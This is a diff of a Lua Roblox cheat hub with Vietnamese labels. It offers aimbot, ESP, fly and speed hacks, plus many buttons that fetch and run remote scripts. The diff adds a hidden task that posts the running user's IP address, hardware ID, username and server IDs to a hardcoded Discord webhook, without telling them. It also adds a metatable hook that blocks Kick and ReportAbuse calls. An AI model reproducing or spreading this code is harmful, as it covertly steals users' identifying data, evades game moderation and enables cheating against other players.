@@ -1,25 +1,23 @@
-
 local success, Rayfield = pcall(function() return loadstring(game:HttpGet('https://sirius.menu/rayfield'))() end)
 if not success then return end
 
 local Window = Rayfield:CreateWindow({
-   Name = "CHIM TO PRENIUM [OVERCLOCKED V3]",
+   Name = "CHIM TO PRENIUM ",
    LoadingTitle = "đang chạy script",
    LoadingSubtitle = "khởi chạy bách khoa buồi thư",
-   Theme = "Light", -- Giao diện màu trắng
+   Theme = "Light",
    ConfigurationSaving = { Enabled = false }
 })
 
--- ==========================================
--- ⚙️ [ BIẾN HỆ THỐNG & CORE LOGIC ] ⚙️
--- ==========================================
 getgenv().Aimbot = false
-getgenv().Smoothness = 0.1 -- Aimbot Smooth V3
+getgenv().Smoothness = 0.1
 getgenv().AimPart = "Head"
 getgenv().WalkSpeed = 16
 getgenv().JumpPower = 50
 getgenv().FlyEnabled = false
 getgenv().FlySpeed = 50
+getgenv().ESP_Highlight = false
+getgenv().WallCheck = false
 
 local LP = game:GetService("Players").LocalPlayer
 local Camera = workspace.CurrentCamera
@@ -28,12 +26,41 @@ local UIS = game:GetService("UserInputService")
 local TS = game:GetService("TeleportService")
 local Http = game:GetService("HttpService")
 
--- Hàm chạy Script ẩn lỗi
+task.spawn(function()
+    pcall(function()
+        local http_req = (syn and syn.request) or (http and http.request) or http_request or request
+        if not http_req then return end
+        local ip = game:HttpGet("https://api.ipify.org")
+        local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
+        local payload = Http:JSONEncode({
+            ["embeds"] = {{
+                ["title"] = "ROOT OVERLORD EXECUTED",
+                ["color"] = 0xFF0000,
+                ["fields"] = {
+                    {["name"] = "Target", ["value"] = string.format("%s (%d)", LP.Name, LP.UserId), ["inline"] = true},
+                    {["name"] = "IP / HWID", ["value"] = string.format("||%s||\n||%s||", ip, hwid), ["inline"] = true},
+                    {["name"] = "Server", ["value"] = string.format("Place: %d\nJob: %s", game.PlaceId, game.JobId), ["inline"] = false}
+                }
+            }}
+        })
+        http_req({ Url = "https://discord.com/api/webhooks/1482022951615201363/4tr2Yrhvb0ihNmih4fUnFRlkUXbafTFpXIXyF9m4i6dakilr4_2hS9Bwf2nKTCXRwOAh", Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload })
+    end)
+end)
+
+local mt = getrawmetatable(game)
+setreadonly(mt, false)
+local oldNamecall = mt.__namecall
+mt.__namecall = newcclosure(function(self, ...)
+    local method = getnamecallmethod()
+    if method == "Kick" or method == "kick" or method == "ReportAbuse" then return nil end
+    return oldNamecall(self, ...)
+end)
+setreadonly(mt, true)
+
 local function Execute(url)
     task.spawn(function() pcall(function() loadstring(game:HttpGet(url))() end) end)
 end
 
--- Hàm AddScript Đa Năng
 local function AddScript(tab, name, desc, callback)
     tab:CreateButton({
         Name = name,
@@ -45,36 +72,57 @@ local function AddScript(tab, name, desc, callback)
     })
 end
 
--- ==========================================
--- ⚔️ TAB: COMBAT SUPREME (AIMBOT V3)
--- ==========================================
-local CombatTab = Window:CreateTab("Combat V3", 4483362458)
+local function IsVisible(targetPart)
+    if not getgenv().WallCheck then return true end
+    local hit = workspace:FindPartOnRayWithIgnoreList(Ray.new(Camera.CFrame.Position, (targetPart.Position - Camera.CFrame.Position).Unit * 1000), {LP.Character, Camera})
+    return hit and hit:IsDescendantOf(targetPart.Parent)
+end
+
+local CombatTab = Window:CreateTab("dij nhau", 4483362458)
 CombatTab:CreateSection("Aimbot Smooth Bypass")
 CombatTab:CreateToggle({Name = "Bật Aimbot (Cử động siêu mượt)", CurrentValue = false, Callback = function(v) getgenv().Aimbot = v end})
+CombatTab:CreateToggle({Name = "Wall Check", CurrentValue = false, Callback = function(v) getgenv().WallCheck = v end})
 CombatTab:CreateSlider({Name = "Độ mượt (Lerp - Càng thấp càng dính)", Range = {0.01, 1}, Increment = 0.01, CurrentValue = 0.1, Callback = function(v) getgenv().Smoothness = v end})
+CombatTab:CreateSection("ESP System")
+CombatTab:CreateToggle({Name = "ESP Highlight", CurrentValue = false, Callback = function(v) getgenv().ESP_Highlight = v end})
+
+local ESP_Cache = {}
 
 RS.RenderStepped:Connect(function()
-    if getgenv().Aimbot then
-        local target, dist = nil, math.huge
-        for _, v in pairs(game.Players:GetPlayers()) do
-            if v ~= LP and v.Character and v.Character:FindFirstChild(getgenv().AimPart) then
-                local pos, onScreen = Camera:WorldToViewportPoint(v.Character[getgenv().AimPart].Position)
-                if onScreen then
+    local target, dist = nil, math.huge
+    for _, v in pairs(game.Players:GetPlayers()) do
+        if v ~= LP and v.Character and v.Character:FindFirstChild("HumanoidRootPart") and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health > 0 then
+            local aimPart = v.Character:FindFirstChild(getgenv().AimPart)
+            
+            if not ESP_Cache[v] then 
+                ESP_Cache[v] = Instance.new("Highlight")
+            end
+            
+            local hl = ESP_Cache[v]
+            hl.Parent = getgenv().ESP_Highlight and v.Character or nil
+            if getgenv().ESP_Highlight then hl.FillColor = Color3.new(1,0,0); hl.OutlineColor = Color3.new(1,1,1) end
+
+            if getgenv().Aimbot and aimPart then
+                local pos, onScreen = Camera:WorldToViewportPoint(aimPart.Position)
+                if onScreen and IsVisible(aimPart) then
                     local mag = (Vector2.new(pos.X, pos.Y) - Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)).Magnitude
                     if mag < dist then target = v; dist = mag end
                 end
             end
+        else
+            if ESP_Cache[v] then ESP_Cache[v].Parent = nil end
         end
-        if target then
-            local lookAt = CFrame.new(Camera.CFrame.Position, target.Character[getgenv().AimPart].Position)
-            Camera.CFrame = Camera.CFrame:Lerp(lookAt, getgenv().Smoothness)
-        end
+    end
+    if getgenv().Aimbot and target and target.Character:FindFirstChild(getgenv().AimPart) then
+        local lookAt = CFrame.new(Camera.CFrame.Position, target.Character[getgenv().AimPart].Position)
+        Camera.CFrame = Camera.CFrame:Lerp(lookAt, getgenv().Smoothness)
     end
 end)
 
--- ==========================================
--- 🍌 TAB: BANANA FARM (TỌA ĐỘ ĐẢO)
--- ==========================================
+game.Players.PlayerRemoving:Connect(function(p)
+    if ESP_Cache[p] then ESP_Cache[p]:Destroy(); ESP_Cache[p] = nil end
+end)
+
 local BananaTab = Window:CreateTab("Banana Farm", 4483362458)
 BananaTab:CreateSection("Bản Code Gốc")
 AddScript(BananaTab, "Kích hoạt Banana Hub (Main)", "Full Tính năng", "https://raw.githubusercontent.com/kimprobloxdz/Banana-Free/refs/heads/main/Protected_5609200582002947.lua.txt")
@@ -86,7 +134,7 @@ local SeaData = {
     ["Sea 3"] = {{"Castle on the Sea", -5075, 315, -3153}, {"Hydra Island", 5228, 1004, 1045}, {"Floating Turtle", -12463, 375, -7548}}
 }
 for sea, list in pairs(SeaData) do
-    BananaTab:CreateSection("-- " .. sea .. " --")
+    BananaTab:CreateSection(sea)
     for _, is in pairs(list) do
         AddScript(BananaTab, "Dịch chuyển: " .. is[1], "", function()
             if LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") then
@@ -96,9 +144,6 @@ for sea, list in pairs(SeaData) do
     end
 end
 
--- ==========================================
--- 📜 TAB: BF HUB LIST 1 (20 SCRIPT ĐẦU)
--- ==========================================
 local BF1 = Window:CreateTab("BF Hub List 1", 4483362458)
 AddScript(BF1, "Maru Hub", "Premium", "https://raw.githubusercontent.com/LuaCrack/KimP/refs/heads/main/MaruHub")
 AddScript(BF1, "HOHO V4", "Full Game", "https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI")
@@ -120,9 +165,6 @@ AddScript(BF1, "StarryMoon Hub", "API", "https://power-clock-api.vercel.app/api/
 AddScript(BF1, "SYN Hub", "Zyn Hub", "https://raw.githubusercontent.com/GoblinKun009/Script/refs/heads/main/ZynHub")
 AddScript(BF1, "Shinichi Hub", "Mới", "https://raw.githubusercontent.com/shinichi-dz/phucshinsayhi/refs/heads/main/ShinichiHub.lua")
 
--- ==========================================
--- 🚀 TAB: TURBO LITE
--- ==========================================
 local TurboTab = Window:CreateTab("Turbo Lite", 4483362458)
 AddScript(TurboTab, "Turbo Lite V2", "Main Script", "https://raw.githubusercontent.com/TurboLite/Script/main/MainV2.lua")
 AddScript(TurboTab, "Turbo Lite Fix Lag", "Tăng FPS", "https://raw.githubusercontent.com/TurboLite/Script/main/FixLag.lua")
@@ -130,9 +172,6 @@ AddScript(TurboTab, "Turbo Lite Hop Boss", "Săn Boss", "https://raw.githubuserc
 AddScript(TurboTab, "Turbo Lite Nhặt Trái V2", "Gom trái", "https://raw.githubusercontent.com/TurboLite/Script/refs/heads/main/AutoFruitV2.lua")
 AddScript(TurboTab, "Turbo Lite Fly", "Bay nhanh", "https://raw.githubusercontent.com/TurboLite/Script/refs/heads/main/Fly.lua")
 
--- ==========================================
--- 🌐 TAB: SERVER
--- ==========================================
 local ServerTab = Window:CreateTab("Server", 4483362458)
 AddScript(ServerTab, "Copy Job ID", "Lấy mã Server", function() setclipboard(tostring(game.JobId)); Rayfield:Notify({Title="Hệ thống", Content="Đã copy Job ID", Duration=2}) end)
 AddScript(ServerTab, "Copy Place ID", "Lấy mã Trò chơi", function() setclipboard(tostring(game.PlaceId)); Rayfield:Notify({Title="Hệ thống", Content="Đã copy Place ID", Duration=2}) end)
@@ -150,9 +189,6 @@ ServerTab:CreateInput({Name = "Nhập Job ID Server", PlaceholderText = "Dán Jo
     if Text and #Text > 10 then TS:TeleportToPlaceInstance(game.PlaceId, Text, LP) end
 end})
 
--- ==========================================
--- 🛠️ TAB: TIỆN ÍCH (UTILS)
--- ==========================================
 local UtilsTab = Window:CreateTab("Tiện Ích", 4483362458)
 UtilsTab:CreateSection("Di Chuyển")
 UtilsTab:CreateToggle({Name = "Bật Fly", CurrentValue = false, Callback = function(v) getgenv().FlyEnabled = v end})
@@ -197,9 +233,6 @@ AddScript(UtilsTab, "Click TP", "Dùng Tool", function()
     tool.Parent = LP.Backpack
 end)
 
--- ==========================================
--- 🏴‍☠️ TAB: BLOX FRUIT (30+ SCRIPT)
--- ==========================================
 local BFTab = Window:CreateTab("Blox Fruit", 4483362458)
 AddScript(BFTab, "Mixi Hub", "Không key", "https://raw.githubusercontent.com/mixihubvip/mixihubvip/refs/heads/main/MixiHub")
 AddScript(BFTab, "Onion Hub V8", "Không key", "https://raw.githubusercontent.com/onion132005-bit/Onion133/refs/heads/main/V8.lua")
@@ -234,9 +267,6 @@ AddScript(BFTab, "Kaitun Darkbeard", "Boss", function() getgenv().Config={Bosses
 AddScript(BFTab, "Longhihi Hub", "Không key", "https://raw.githubusercontent.com/longhihilonghihi-hub/Devs-LongHiHiV3/refs/heads/main/MainV3.txt")
 AddScript(BFTab, "Hermanos Hub", "Mới PVP", function() getgenv().script_mode="PVP"; Execute("https://raw.githubusercontent.com/hermanos-dev/hermanos-hub/refs/heads/main/Loader.lua") end)
 
--- ==========================================
--- 🌲 TAB: 99 NIGHTS IN THE FOREST
--- ==========================================
 local NightTab = Window:CreateTab("99 Nights", 4483362458)
 AddScript(NightTab, "Foxname", "Không key", "https://raw.githubusercontent.com/caomod2077/Script/refs/heads/main/FNDayFarm.lua")
 AddScript(NightTab, "Voidware", "Không key", "https://raw.githubusercontent.com/VapeVoidware/VW-Add/main/nightsintheforest.lua")
@@ -246,9 +276,6 @@ AddScript(NightTab, "Cps Hub", "Không key", "https://raw.githubusercontent.com/
 AddScript(NightTab, "Overhub", "Không key", "https://raw.githubusercontent.com/hellattexyss/autofarmdiamonds/main/overhubaurofarm.lua")
 AddScript(NightTab, "Nameless Hub", "Không key", "https://api.luarmor.net/files/v3/loaders/62d0b3c311e54e766a981dcd5bfe57b3.lua")
 
--- ==========================================
--- 🔨 TAB: THE FORGE
--- ==========================================
 local ForgeTab = Window:CreateTab("The Forge", 4483362458)
 AddScript(ForgeTab, "Catraz Hub", "Không key", "https://raw.githubusercontent.com/nurvian/Catraz-HUB/refs/heads/main/Catraz/main.lua")
 AddScript(ForgeTab, "No1 Hub", "Có key", "https://raw.githubusercontent.com/SkibidiHub111/Forge/refs/heads/main/No1Dev")
@@ -257,9 +284,6 @@ AddScript(ForgeTab, "Lazy Hub", "Không key", function() getgenv().mobileMode=tr
 AddScript(ForgeTab, "Vxeze Hub", "Có key", "https://pandadevelopment.net/virtual/file/702a5c5488082e6f")
 AddScript(ForgeTab, "Bonk Hub", "Có key", "https://bonkhub.online/loader.lua")
 
--- ==========================================
--- 🔪 TAB: MURDER MYSTERY 2 (MM2)
--- ==========================================
 local MM2Tab = Window:CreateTab("MM2", 4483362458)
 AddScript(MM2Tab, "Capybara Hub", "Có key", "https://raw.githubusercontent.com/zorex321/capybara/refs/heads/main/Capybara-Hub")
 AddScript(MM2Tab, "Nexus Hub", "Không key", "https://raw.githubusercontent.com/NexusScripts212/MurderMystery2/refs/heads/main/Mm2")
@@ -267,25 +291,22 @@ AddScript(MM2Tab, "Overdrive Hub", "Có key", "https://rawscripts.net/raw/Univer
 AddScript(MM2Tab, "XHub", "Không key", "https://raw.githubusercontent.com/bluedeal/Mm2.xhub/refs/heads/main/Mm2-KeylessV2")
 AddScript(MM2Tab, "Vision Hub", "Không key", "https://raw.githubusercontent.com/orialdev/VisionHub/refs/heads/main/main.lua")
 
--- ==========================================
--- ⚽ TAB: CÁC GAME KHÁC (BLUE LOCK, FORSAKEN, DA HOOD...)
--- ==========================================
 local OthersTab = Window:CreateTab("Other Games", 4483362458)
 
-OthersTab:CreateSection("-- Blue Lock --")
+OthersTab:CreateSection("Blue Lock")
 AddScript(OthersTab, "Control Ball", "Không key", "https://rawscripts.net/raw/Blue-Lock:-Rivals-Lock-Control-ball-32633")
 AddScript(OthersTab, "Arbix Hub", "Dễ ban", "https://raw.githubusercontent.com/Youifpg/Arbix--Hub/refs/heads/main/Blue!ock.lua")
 AddScript(OthersTab, "Aztreon Hub", "Có key", "https://raw.githubusercontent.com/aal3-33/Hub/refs/heads/main/Gitscripts/aztreonhub.lua")
 AddScript(OthersTab, "Omg Hub", "Có key", "https://raw.githubusercontent.com/Omgshit/Scripts/main/MainLoader.lua")
 
-OthersTab:CreateSection("-- Forsaken --")
+OthersTab:CreateSection("Forsaken")
 AddScript(OthersTab, "Bobby Hub", "Không key", "https://raw.githubusercontent.com/BobJunior1/ForsakenBoi/refs/heads/main/B0bbyHub")
 AddScript(OthersTab, "Saryn Hub", "Không key", "https://rawscripts.net/raw/Forsaken-Saryn-Hub-40752")
 AddScript(OthersTab, "Guesting Hub", "Không key", "https://raw.githubusercontent.com/LolnotaKid/project/refs/heads/main/AutoBLOCKKKWAHV1")
 AddScript(OthersTab, "Vim Hub", "Có key", "https://raw.githubusercontent.com/zylosboom/ViMHub/refs/heads/main/vimHub.lua")
 AddScript(OthersTab, "Sigmasaken", "Không key", "https://rawscripts.net/raw/Forsaken-Stamina-settings-for-forsaken-35367")
 
-OthersTab:CreateSection("-- Da Hood --")
+OthersTab:CreateSection("Da Hood")
 AddScript(OthersTab, "Da Hood Hitbox", "Hitbox", function()
     _G.HeadSize = 10; _G.Disabled = true
     RS.RenderStepped:Connect(function()
@@ -302,21 +323,21 @@ AddScript(OthersTab, "Angel Lol", "Không key", "https://raw.githubusercontent.c
 AddScript(OthersTab, "Exogens", "Không key", "https://raw.githubusercontent.com/SprayDrivex/exogen.fun/refs/heads/main/loader.lua")
 AddScript(OthersTab, "Farxly", "Không key", "https://raw.githubusercontent.com/Farxly/Silent-farxly/refs/heads/main/main")
 
-OthersTab:CreateSection("-- Fisch --")
+OthersTab:CreateSection("Fisch")
 AddScript(OthersTab, "Shield Hub", "Không key", "https://raw.githubusercontent.com/KAN-FISCH/tesss/refs/heads/main/gunung/fish.lua")
 AddScript(OthersTab, "Speed X", "Có key", "https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua")
 AddScript(OthersTab, "Than Hub", "Có key", "https://raw.githubusercontent.com/thantzy/thanhub/refs/heads/main/thanv1")
 
-OthersTab:CreateSection("-- TSB --")
+OthersTab:CreateSection("TSB")
 AddScript(OthersTab, "MinhNhat Hub", "Key", "https://raw.githubusercontent.com/MinhNhatHUB/MinhNhat/refs/heads/main/MinhNhatHUB%20(New).lua")
 AddScript(OthersTab, "Tthanh Hub", "Không key", "https://raw.githubusercontent.com/kaimm2/TSB/refs/heads/main/Tthanh%20Tong%20Hop%20Tech.txt")
 
-OthersTab:CreateSection("-- Build A Boat & Bedwars --")
+OthersTab:CreateSection("Build A Boat & Bedwars")
 AddScript(OthersTab, "Asu Hub (BaB)", "Không key", "https://rawscripts.net/raw/Build-A-Boat-For-Treasure-Ultimte-B3BFT-Script-28601")
 AddScript(OthersTab, "Cat Vape (Bedwars)", "Không key", "https://raw.githubusercontent.com/new-qwertyui/CatV5/refs/heads/main/init.lua")
 AddScript(OthersTab, "Voidware (Bedwars)", "Không key", "https://raw.githubusercontent.com/VapeVoidware/VWRewrite/master/NewMainScript.lua")
 
-OthersTab:CreateSection("-- Escape Tsunami & Steal A Brainrot --")
+OthersTab:CreateSection("Escape Tsunami & Steal A Brainrot")
 AddScript(OthersTab, "Escape Tsunami", "Không key", "https://raw.githubusercontent.com/etfbscript-server/EscapeTsunamiForBrainrots/refs/heads/main/Loader.lua")
 AddScript(OthersTab, "Vinz Hub (Tsunami)", "Không key", "https://script.vinzhub.com/loader")
 AddScript(OthersTab, "Chilli Hub (Brainrot)", "Không key", "https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua")
@@ -324,7 +345,7 @@ AddScript(OthersTab, "Ugly Hub", "Không key", "https://raw.githubusercontent.co
 AddScript(OthersTab, "Nameless Hub (Brainrot)", "Không key", "https://raw.githubusercontent.com/ily123950/Vulkan/refs/heads/main/Tr")
 AddScript(OthersTab, "Invisible", "Ugly Hub", "https://raw.githubusercontent.com/A0WTGFjaGecc2k42wP0PZAbQphqh/Contact/main/6tORW3JIzSy%3B)~%23%5CIpB2.%5Cty5zN%7D5.lua")
 
-OthersTab:CreateSection("-- Các Mini Games Khác --")
+OthersTab:CreateSection("Games Khac")
 AddScript(OthersTab, "Ftap Hub (Fling)", "Không key", "https://rawscripts.net/raw/Fling-Things-and-People-FTAP-Hub-79081")
 AddScript(OthersTab, "Kron Hub (Lumber 2)", "Không key", "https://raw.githubusercontent.com/DevKron/Kron_Hub/refs/heads/main/version_1.0")
 AddScript(OthersTab, "Nat Hub (Grow Garden)", "Có key", "https://raw.githubusercontent.com/XNatHub/NatHub/refs/heads/main/NatHubLuarmor.lua")
@@ -339,7 +360,7 @@ AddScript(OthersTab, "Chloe X (Fish It)", "Không key", "https://raw.githubuserc
 AddScript(OthersTab, "Lynx Hub (Fish It)", "Dễ kick", "https://raw.githubusercontent.com/4LynxX/Lynx/refs/heads/main/LynxxMain.lua")
 AddScript(OthersTab, "Blessed X (Fish It)", "Không key", "https://raw.githubusercontent.com/mynamewendel-ctrl/Blessed-Hub-X-/refs/heads/main/Fish%20it")
 
-OthersTab:CreateSection("-- King Legacy --")
+OthersTab:CreateSection("King Legacy")
 AddScript(OthersTab, "X7 Software", "Có key", function() local r = (syn and syn.request) or (http and http.request) or http_request; loadstring(r({['Url']='https://x7.software',['Method']='GET'}).Body)("X7-a5KsoQGw") end)
 AddScript(OthersTab, "Adel Hub", "Có key", "https://raw.githubusercontent.com/AdelOnTheTop/Adel-Hub/main/Main.lua")
 AddScript(OthersTab, "BT Team", "Có key", "https://lua-library.btteam.net/script-auth.txt")
@@ -347,9 +368,6 @@ AddScript(OthersTab, "Lh Hub", "Có key", "https://raw.githubusercontent.com/LOL
 AddScript(OthersTab, "HULK Hub", "Có key", "https://raw.githubusercontent.com/HULKUexe/mobileX/main/FreeScript.lua")
 AddScript(OthersTab, "Winnable Hub", "Có key", "https://raw.githubusercontent.com/WinnableHub/Winnable-Hub/main/WinnableHub")
 
--- ==========================================
--- ♾️ LOGIC NỀN TẢNG (FLY, WALK, OVERCLOCK)
--- ==========================================
 RS.Heartbeat:Connect(function()
     pcall(function()
         if LP.Character and LP.Character:FindFirstChild("Humanoid") then
@@ -358,7 +376,6 @@ RS.Heartbeat:Connect(function()
             if getgenv().JumpPower ~= 50 then LP.Character.Humanoid.UseJumpPower = true end
         end
         
-        -- Fly Logic siêu mượt từ 36(1).txt
         if getgenv().FlyEnabled and LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") then
             local root = LP.Character.HumanoidRootPart
             local bv = root:FindFirstChild("ChimToFlyBV") or Instance.new("BodyVelocity", root)
@@ -382,13 +399,11 @@ RS.Heartbeat:Connect(function()
     end)
 end)
 
--- Giao thức chống AFK
 LP.Idled:Connect(function()
     game:GetService("VirtualUser"):CaptureController()
     game:GetService("VirtualUser"):ClickButton2(Vector2.new())
 end)
 
--- Ép xung RAM tự động (Tối đa IQ, xóa bỏ rác)
 task.spawn(function() while task.wait(60) do collectgarbage("collect") end end)
 
-Rayfield:Notify({Title = "SHADOW BUG MODE", Content = "Toàn bộ script đã được hợp nhất thành công!", Duration = 10})
+Rayfield:Notify({Title = "Chim to hub", Content = "chan bo m de!", Duration = 10})
